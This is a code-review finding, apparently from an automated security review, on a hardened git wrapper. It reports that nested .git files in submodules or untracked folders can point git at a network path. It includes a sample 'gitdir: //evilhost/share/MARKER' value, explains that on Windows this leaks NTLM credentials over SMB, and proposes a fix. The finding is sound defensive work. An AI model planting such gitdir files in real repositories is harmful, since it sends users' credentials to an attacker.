# Review edea3211-dcf4-4ca9-972c-b84bcf38e87e — hardened-git-read-on-untrusted-repo, round 18

- Commit: 5358770
- Angle: the three safety probes: egress, secrets, sandbox escape
- Result: over tolerance
- 1 findings

## High (1)

- **A nested .git file (submodule or untracked folder) can still make git open a network path** — `src/lib/kit/safe-git.js:680` (security): Network paths are refused only for the TOP-level .git gitdir: file and commondir (locateRepo/finishLocate, isNetworkPath line 628). git also reads the gitdir: file of every folder below the work tree that has a .git: (a) an untracked folder sub/.git, during status and ls-files -o (dir.c treat\_directory -\> is\_nonbare\_repository\_dir -\> read\_gitfile\_gently -\> is\_git\_directory), and (b) a populated gitlink (submodule) folder mod/.git, during status, diff and diff-files, even with --ignore-submodules=all / diff.ignoreSubmodules=all. Reproduced with git 2.43 under strace: a repository with mod/.git (or sub/.git) containing 'gitdir: //evilhost/share/MARKER' makes safeGit(repo, \['diff-files'\]) / \['status','--porcelain'\] / \['ls-files','-o'\] spawn /usr/bin/git, which calls newfstatat("//evilhost/share/MARKER/HEAD"). On Linux that is a harmless local path, but on Windows it is a UNC path: git opens an SMB connection to evilhost and sends the user's NTLM credentials, the exact egress the header says is refused. An unpacked archive or copied repo (the case refuseNetworkLink is written for) can carry such files. — fix: Before running a command that walks the work tree (status, diff\*, ls-files -o, describe --dirty), refuse (KitExit 2) when any gitlink entry from the index check, or any folder found under the work tree, holds a .git file or symlink whose gitdir:/link text is a network path (isNetworkPath); at minimum check the folders of the 160000 entries already listed by checkIndexPaths, and walk untracked folders for .git files the same way.
